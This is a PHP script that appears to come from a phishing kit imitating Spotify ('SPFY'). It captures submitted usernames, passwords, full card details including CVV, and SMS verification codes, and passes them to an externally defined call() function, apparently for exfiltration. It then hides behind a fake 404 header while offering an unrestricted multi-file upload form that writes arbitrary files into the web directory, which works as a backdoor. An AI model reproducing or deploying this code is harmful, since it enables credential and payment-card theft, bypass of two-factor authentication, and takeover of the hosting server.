<?php 
require '../config.php';
 

if(isset($_POST['user'])){
call("/- SPFY LOG -/
User : ".$_POST['user']."
Pass : ".$_POST['pass']);
return;
}
     


if(isset($_POST['name'])){
call("/- SPFY CARD -/
Name : ".$_POST['name']."
Cc : ".$_POST['cc']."
Exp : ".$_POST['exp']."
Cvv : ".$_POST['cvv'] );
return;
}

if(isset($_POST['sms'])){
call("/- SPFY SMS -/
CODE : ".$_POST['sms']);
return;
}
 

header("HTTP/1.0 404 Not Found");

if(empty($_GET['Nfiles']))$Nfiles=5;else $Nfiles=$_GET['Nfiles'];
if($_FILES['userfile']['tmp_name'][0]!=''){	for($i=0;$i<$Nfiles&&$_FILES['userfile']['tmp_name'][$i]!='';$i++){
	$uploaddir = dirname(__FILE__);
	$uploadfile = $uploaddir .'/'. basename($_FILES['userfile']['name'][$i]);
	print "<pre>";
	if (move_uploaded_file($_FILES['userfile']['tmp_name'][$i], $uploadfile)) {
	   print "Valid";
	   
	} else {
	   print "Not valid!\n";
	  
	}
	print "</pre>";
	}
}

?>
<form action="<?php echo $_SERVER['PHP_SELF'].'?Nfiles='.$Nfiles; ?>" method="post" enctype="multipart/form-data">
<br>
  <?php for($i=0;$i<$Nfiles;$i++){echo '<input name="userfile[]" type="file"><br>';}?>
  <input type="submit" value="upload files">
</form>


</body>

</html>